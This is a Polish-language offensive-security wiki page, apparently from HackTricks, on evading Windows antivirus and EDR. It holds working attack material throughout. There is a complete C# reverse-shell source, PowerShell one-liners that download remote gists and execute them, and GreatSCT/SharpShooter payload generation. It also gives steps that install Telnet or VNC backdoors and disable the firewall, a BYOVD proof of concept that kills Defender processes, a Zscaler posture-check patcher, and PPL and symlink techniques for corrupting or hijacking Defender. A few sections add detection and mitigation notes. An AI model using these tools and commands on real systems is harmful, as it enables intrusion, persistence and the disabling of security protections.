SmartScreen działa głównie w oparciu o podejście bazujące na reputacji, co oznacza, że rzadko pobierane applications uruchomią SmartScreen, tym samym ostrzegając i uniemożliwiając końcowemu użytkownikowi uruchomienie pliku (choć plik nadal można uruchomić, klikając More Info -> Run anyway).

**MoTW** (Mark of The Web) to [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) o nazwie Zone.Identifier, który jest automatycznie tworzony podczas pobierania plików z internetu, wraz z URL, z którego został pobrany.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Sprawdzanie ADS Zone.Identifier dla pliku pobranego z internetu.</p></figcaption></figure>

> [!TIP]
> Warto zauważyć, że executable podpisane **trusted** certyfikatem signing **won't trigger SmartScreen**.

Bardzo skutecznym sposobem na zapobieganie nadawaniu payloads znacznika Mark of The Web jest pakowanie ich wewnątrz jakiegoś kontenera, takiego jak ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **cannot** być zastosowany do wolumenów **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) to narzędzie, które pakuje payloads do kontenerów wyjściowych, aby evade Mark-of-the-Web.

Przykładowe użycie:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Oto demo omijania SmartScreen przez pakowanie payloadów wewnątrz plików ISO przy użyciu [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) to potężny mechanizm logowania w Windows, który pozwala aplikacjom i komponentom systemowym **logować zdarzenia**. Może być jednak również używany przez produkty bezpieczeństwa do monitorowania i wykrywania złośliwych działań.

Podobnie jak AMSI jest wyłączane (bypassowane), możliwe jest też sprawienie, aby funkcja **`EtwEventWrite`** procesu w przestrzeni użytkownika zwracała natychmiast bez logowania jakichkolwiek zdarzeń. Osiąga się to przez załatanie funkcji w pamięci tak, aby natychmiast zwracała, skutecznie wyłączając logowanie ETW dla tego procesu.

Więcej informacji znajdziesz w **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Ładowanie binariów C# do pamięci jest znane od bardzo dawna i nadal jest świetnym sposobem na uruchamianie narzędzi post-exploitation bez wykrycia przez AV.

Ponieważ payload zostanie załadowany bezpośrednio do pamięci, bez dotykania dysku, będziemy musieli martwić się jedynie o załatanie AMSI dla całego procesu.

Większość frameworków C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) już zapewnia możliwość wykonywania C# assemblies bezpośrednio w pamięci, ale istnieją różne sposoby, aby to zrobić:

- **Fork\&Run**

Polega to na **uruchomieniu nowego procesu ofiarnego**, wstrzyknięciu do tego nowego procesu złośliwego kodu post-exploitation, wykonaniu złośliwego kodu, a po zakończeniu — zabiciu nowego procesu. Ma to zarówno zalety, jak i wady. Zaletą metody fork and run jest to, że wykonanie odbywa się **poza** procesem naszego implant Beacon. Oznacza to, że jeśli coś pójdzie nie tak podczas naszego działania post-exploitation albo zostanie to wykryte, istnieje **znacznie większa szansa**, że nasz **implant przetrwa.** Wadą jest **znacznie większa szansa** wykrycia przez **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Chodzi o wstrzyknięcie złośliwego kodu post-exploitation **do własnego procesu**. W ten sposób można uniknąć tworzenia nowego procesu i skanowania go przez AV, ale wadą jest to, że jeśli coś pójdzie nie tak podczas wykonywania payloadu, istnieje **znacznie większa szansa** na **utratę beacona**, ponieważ może dojść do crasha.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Jeśli chcesz przeczytać więcej o ładowaniu C# Assembly, sprawdź ten artykuł [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) oraz ich InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Możesz też ładować C# Assemblies **z PowerShell**, sprawdź [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) oraz [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Jak zaproponowano w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), możliwe jest wykonywanie złośliwego kodu przy użyciu innych języków, dając skompromitowanej maszynie dostęp **do środowiska interpreterów zainstalowanego na kontrolowanym przez atakującego udziale SMB**.

Udostępniając dostęp do Interpreter Binaries i środowiska na udziale SMB, możesz **uruchamiać arbitralny kod w tych językach w pamięci** skompromitowanej maszyny.

Repo wskazuje: Defender nadal skanuje skrypty, ale dzięki wykorzystaniu Go, Java, PHP itd. mamy **większą elastyczność w omijaniu statycznych sygnatur**. Testy z losowymi, nieobfuskowanymi skryptami reverse shell w tych językach zakończyły się powodzeniem.

## TokenStomping

Token stomping to technika, która pozwala atakującemu **manipulować access tokenem lub produktem bezpieczeństwa takim jak EDR lub AV**, umożliwiając obniżenie jego uprawnień tak, aby proces nie umarł, ale nie miał uprawnień do sprawdzania złośliwych działań.

Aby temu zapobiec, Windows mógłby **uniemożliwić procesom zewnętrznym** uzyskiwanie uchwytów do tokenów procesów bezpieczeństwa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Jak opisano w [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), łatwo jest po prostu wdrożyć Chrome Remote Desktop na komputerze ofiary, a następnie użyć go do przejęcia kontroli i utrzymania persistence:
1. Pobierz z https://remotedesktop.google.com/, kliknij "Set up via SSH", a następnie kliknij plik MSI dla Windows, aby pobrać plik MSI.
2. Uruchom instalator cicho na ofierze (wymagane admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Wróć na stronę Chrome Remote Desktop i kliknij dalej. Kreator poprosi wtedy o autoryzację; kliknij przycisk Authorize, aby kontynuować.
4. Wykonaj podany parametr z pewnymi zmianami: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Zwróć uwagę na parametr pin, który pozwala ustawić pin bez używania GUI).


## Advanced Evasion

Evasion to bardzo złożony temat, czasem trzeba brać pod uwagę wiele różnych źródeł telemetry w jednym systemie, więc w dojrzałych środowiskach praktycznie niemożliwe jest całkowite pozostanie niewykrytym.

Każde środowisko, przeciwko któremu działasz, będzie miało swoje mocne i słabe strony.

Zdecydowanie zachęcam do obejrzenia tego wystąpienia od [@ATTL4S](https://twitter.com/DaniLJ94), aby zdobyć podstawy bardziej zaawansowanych technik Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

to także kolejne świetne wystąpienie od [@mariuszbit](https://twitter.com/mariuszbit) o Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Możesz użyć [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), który **usunie części binarki**, aż **ustali, którą część Defender** uznaje za złośliwą, i poda Ci ją w postaci podzielonej.\
Narzędziem robiącym **to samo jest** [**avred**](https://github.com/dobin/avred) z otwartą usługą webową pod adresem [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do czasu Windows10 wszystkie Windowsy były dostarczane z **serwerem Telnet**, który można było zainstalować (jako administrator), wykonując:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Spraw, aby **uruchamiało się** przy starcie systemu i **uruchom** to teraz:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Zmień port telnet** (stealth) i wyłącz firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pobierz stąd: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (chcesz binarne pliki do pobrania, nie setup)

**NA HOSTIE**: Uruchom _**winvnc.exe**_ i skonfiguruj serwer:

- Włącz opcję _Disable TrayIcon_
- Ustaw hasło w _VNC Password_
- Ustaw hasło w _View-Only Password_

Następnie przenieś binarny _**winvnc.exe**_ oraz nowo utworzony plik _**UltraVNC.ini**_ do **victim**

#### **Reverse connection**

**attacker** powinien **uruchomić na swoim** **hoście** binarny `vncviewer.exe -listen 5900`, aby był **gotowy** na przechwycenie reverse **VNC connection**. Następnie, na **victim**: Uruchom demona winvnc `winvnc.exe -run` i uruchom `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Aby zachować stealth, nie możesz zrobić kilku rzeczy

- Nie uruchamiaj `winvnc`, jeśli już działa, bo wywołasz [popup](https://i.imgur.com/1SROTTl.png). sprawdź, czy działa, używając `tasklist | findstr winvnc`
- Nie uruchamiaj `winvnc` bez `UltraVNC.ini` w tym samym katalogu, bo spowoduje to otwarcie [the config window](https://i.imgur.com/rfMQWcf.png)
- Nie uruchamiaj `winvnc -h` po pomoc, bo wywołasz [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pobierz stąd: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Inside GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Teraz **uruchom lister** za pomocą `msfconsole -r file.rc` i **wykonaj** **xml payload** z:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Obecny defender bardzo szybko zakończy proces.**

### Kompilowanie własnego reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwszy C# Revershell

Skompiluj go za pomocą:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Użyj tego z:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatyczne pobieranie i uruchamianie:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuskatorów C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Using python for build injectors example:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Other tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Więcej

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 wykorzystał małe narzędzie konsolowe znane jako **Antivirus Terminator**, aby wyłączyć ochronę endpointów przed uruchomieniem ransomware. Narzędzie dostarcza swój **własny podatny, ale *signed* sterownik** i nadużywa go do wykonywania uprzywilejowanych operacji w kernelu, których nawet usługi Protected-Process-Light (PPL) AV nie mogą zablokować.

Kluczowe wnioski
1. **Signed driver**: Plik dostarczany na dysk to `ServiceMouse.sys`, ale binaria to prawidłowo podpisany sterownik `AToolsKrnl64.sys` z “System In-Depth Analysis Toolkit” firmy Antiy Labs. Ponieważ sterownik ma ważny podpis Microsoft, ładuje się nawet przy włączonym Driver-Signature-Enforcement (DSE).
2. **Instalacja usługi**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Pierwsza linia rejestruje sterownik jako **kernel service**, a druga uruchamia go tak, że `\\.\ServiceMouse` staje się dostępne z user land.
3. **IOCTLs udostępniane przez sterownik**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Zakończenie dowolnego procesu po PID (używane do zabicia Defender/EDR services) |
| `0x990000D0` | Usunięcie dowolnego pliku z dysku |
| `0x990001D0` | Załadowanie sterownika i usunięcie usługi |

Minimalny C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Dlaczego to działa**:  BYOVD całkowicie omija user-mode protections; kod wykonujący się w kernelu może otwierać *protected* processes, kończyć je albo modyfikować kernel objects niezależnie od PPL/PP, ELAM lub innych hardening features.

Detection / Mitigation
•  Włącz Microsoft vulnerable-driver block list (`HVCI`, `Smart App Control`), aby Windows odmawiał ładowania `AToolsKrnl64.sys`.
•  Monitoruj tworzenie nowych *kernel* services i alarmuj, gdy sterownik jest ładowany z katalogu world-writable albo nie znajduje się na allow-list.
•  Obserwuj handle user-mode do custom device objects, po których następują podejrzane wywołania `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

**Client Connector** firmy Zscaler stosuje local device-posture rules i używa Windows RPC do przekazywania wyników do innych komponentów. Dwie słabe decyzje projektowe umożliwiają pełny bypass:

1. Ocena posture odbywa się **w całości po stronie klienta** (na serwer wysyłany jest boolean).
2. Wewnętrzne RPC endpoints sprawdzają jedynie, czy łączący się executable jest **signed by Zscaler** (przez `WinVerifyTrust`).

Poprzez **patching czterech podpisanych binary na dysku** można zneutralizować oba mechanizmy:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Zawsze zwraca `1`, więc każdy check jest compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ każdy proces (nawet unsigned) może podłączyć się do RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zastąpione przez `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Minimalny fragment patchera:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Po zastąpieniu oryginalnych plików i ponownym uruchomieniu stosu usług:

* **Wszystkie** kontrole postawy pokazują **zielony/zgodny** status.
* Niepodpisane lub zmodyfikowane binaria mogą otwierać endpointy RPC named-pipe (np. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Skompromitowany host uzyskuje nieograniczony dostęp do sieci wewnętrznej zdefiniowanej przez polityki Zscaler.

To studium przypadku pokazuje, jak decyzje zaufania wyłącznie po stronie klienta oraz proste sprawdzanie podpisów można obejść kilkoma patchami bajtów.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) wymusza hierarchię signer/level, tak aby tylko procesy chronione o równym lub wyższym poziomie mogły modyfikować się nawzajem. Z perspektywy ofensywnej, jeśli możesz legalnie uruchomić binarium z włączonym PPL i kontrolować jego argumenty, możesz przekształcić benign functionality (np. logging) w ograniczony, oparty na PPL write primitive przeciwko chronionym katalogom używanym przez AV/EDR.

Co sprawia, że proces działa jako PPL
- Docelowy EXE (i każdy załadowany DLL) musi być podpisany EKU zgodnym z PPL.
- Proces musi zostać utworzony przez CreateProcess z flagami: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Należy zażądać zgodnego protection level, który pasuje do signer binarium (np. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` dla anti-malware signers, `PROTECTION_LEVEL_WINDOWS` dla Windows signers). Nieprawidłowe poziomy zakończą się błędem podczas tworzenia.

Zobacz także szersze wprowadzenie do PP/PPL i ochrony LSASS tutaj:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (wybiera protection level i przekazuje argumenty do docelowego EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Wzorzec użycia:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Podpisany binarny plik systemowy `C:\Windows\System32\ClipUp.exe` sam się uruchamia i akceptuje parametr do zapisania pliku logu w ścieżce wskazanej przez wywołującego.
- Gdy uruchomiony jako proces PPL, zapis pliku odbywa się z backing PPL.
- ClipUp nie potrafi parsować ścieżek zawierających spacje; użyj 8.3 short paths, aby wskazać normalnie chronione lokalizacje.

8.3 short path helpers
- Wyświetlenie short names: `dir /x` w każdym katalogu nadrzędnym.
- Wyprowadzenie short path w cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Uruchom PPL-capable LOLBIN (ClipUp) z `CREATE_PROTECTED_PROCESS` używając launchera (np. CreateProcessAsPPL).
2) Przekaż argument ClipUp log-path, aby wymusić utworzenie pliku w chronionym katalogu AV (np. Defender Platform). Użyj 8.3 short names, jeśli trzeba.
3) Jeśli docelowy binarny plik jest normalnie otwarty/zablokowany przez AV podczas działania (np. MsMpEng.exe), zaplanuj zapis przy boot przed uruchomieniem AV, instalując usługę auto-start, która niezawodnie uruchamia się wcześniej. Zweryfikuj kolejność bootowania za pomocą Process Monitor (boot logging).
4) Po reboot zapis z backing PPL nastąpi, zanim AV zablokuje swoje binaria, uszkadzając plik docelowy i uniemożliwiając start.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Uwagi i ograniczenia
- Nie możesz kontrolować zawartości, którą ClipUp zapisuje poza umiejscowieniem; ten primitive nadaje się do corruption, a nie do precyzyjnego wstrzykiwania contentu.
- Wymaga local admin/SYSTEM, aby zainstalować/uruchomić service, oraz okna reboot.
- Timing jest krytyczny: target nie może być otwarty; wykonanie podczas boot-time omija file locks.

Detections
- Process creation `ClipUp.exe` z nietypowymi arguments, szczególnie uruchamiany przez nietypowe launchers, w okolicach boot.
- Nowe services skonfigurowane do auto-start suspicious binaries i konsekwentnie uruchamiające się przed Defender/AV. Zbadaj tworzenie/modyfikację service przed błędami startu Defender.
- File integrity monitoring na binary Defender/Platform directories; nieoczekiwane file creations/modifications przez processes z protected-process flags.
- ETW/EDR telemetry: szukaj processes utworzonych z `CREATE_PROTECTED_PROCESS` i anomalii użycia poziomu PPL przez nie-AV binaries.

Mitigations
- WDAC/Code Integrity: ogranicz, które signed binaries mogą działać jako PPL i pod jakimi parentami; blokuj wywołanie ClipUp poza legalnymi kontekstami.
- Service hygiene: ogranicz tworzenie/modyfikację auto-start services i monitoruj manipulację kolejnością startu.
- Upewnij się, że Defender tamper protection i early-launch protections są włączone; badaj błędy startup wskazujące na binary corruption.
- Rozważ wyłączenie generowania 8.3 short-name na woluminach hostujących security tooling, jeśli jest to zgodne z Twoim środowiskiem (przetestuj dokładnie).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender wybiera platformę, z której działa, przez wyliczanie subfolderów pod:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Wybiera podfolder z najwyższym leksykograficznie stringiem wersji (np. `4.18.25070.5-0`), a następnie uruchamia stamtąd procesy service Defender (aktualizując odpowiednio service/registry paths). To wybranie ufa wpisom katalogu, w tym directory reparse points (symlinks). Administrator może to wykorzystać do przekierowania Defender na attacker-writable path i osiągnięcia DLL sideloading albo service disruption.

Preconditions
- Local Administrator (potrzebny do tworzenia katalogów/symlinków pod folderem Platform)
- Możliwość reboot albo wymuszenia ponownego wyboru platformy Defender (service restart przy boot)
- Wymagane tylko wbudowane narzędzia (mklink)

Why it works
- Defender blokuje zapisy we własnych folderach, ale wybór platformy ufa wpisom katalogu i wybiera leksykograficznie najwyższą wersję bez sprawdzania, czy cel prowadzi do protected/trusted path.

Step-by-step (example)
1) Przygotuj zapisywalną kopię bieżącego folderu platformy, np. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Utwórz symlink katalogu o wyższej wersji wewnątrz Platform wskazujący na twój folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Wyzwolenie selekcji (zalecany reboot):
```cmd
shutdown /r /t 0
```
4) Zweryfikuj, czy MsMpEng.exe (WinDefend) działa z przekierowanej ścieżki:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Powinieneś obserwować nowy path procesu w `C:\TMP\AV\` oraz konfigurację usługi/registry odzwierciedlającą tę lokalizację.

Post-exploitation options
- DLL sideloading/code execution: Podmień/zastąp DLL-e, które Defender ładuje ze swojego application directory, aby wykonać code w procesach Defendera. Zobacz sekcję powyżej: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Usuń version-symlink, aby przy następnym uruchomieniu skonfigurowany path nie dał się rozwiązać i Defender nie uruchomił się:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Zauważ, że ta technika sama w sobie nie zapewnia eskalacji uprawnień; wymaga praw administratora.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams mogą przenieść runtime evasion z implant C2 do samego modułu docelowego, hookując jego Import Address Table (IAT) i kierując wybrane API przez kontrolowany przez atakującego, position‑independent code (PIC). To uogólnia evasion poza mały obszar API, który ujawnia wiele kitów (np. CreateProcessA), i rozszerza te same zabezpieczenia na BOFs i DLL-e post-exploitation.

Podejście wysokiego poziomu
